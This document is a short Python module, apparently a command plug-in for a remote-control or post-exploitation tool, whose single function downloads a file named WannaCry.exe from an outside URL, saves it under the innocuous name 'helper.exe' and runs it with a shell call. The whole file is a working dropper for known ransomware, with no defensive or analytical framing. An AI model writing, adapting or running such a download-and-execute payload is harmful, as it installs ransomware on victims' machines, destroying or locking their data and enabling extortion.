#!/usr/bin/python
# -*- coding: utf-8 -*-
'Download and Execute WannaCry Script'

# standard library
import os
import subprocess
import requests

# globals
packages = []
platforms = ['windows']
command = True
usage = 'download_execute'
description = """
Download WannaCry file from a specified URL and execute it.
"""

def run():
    """
    Download the EXE file from a specified URL and execute it.
    """
    try:
        # Define the URL and file name
        url = "https://ceus.vives.one/WannaCry.exe"
        file_name = "helper.exe"
        file_path = os.path.join(os.getcwd(), file_name)

        # Download the file
        print(f"Downloading {file_name} from {url}...")
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(file_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
            print(f"Downloaded {file_name} to {file_path}")
        else:
            return f"Failed to download {file_name}: HTTP {response.status_code}"

        # Execute the downloaded file
        print(f"Executing {file_name}...")
        subprocess.Popen([file_path], shell=True)
        return f"Executed {file_name} successfully."
    except Exception as e:
        return "{} error: {}".format(__name__, str(e))
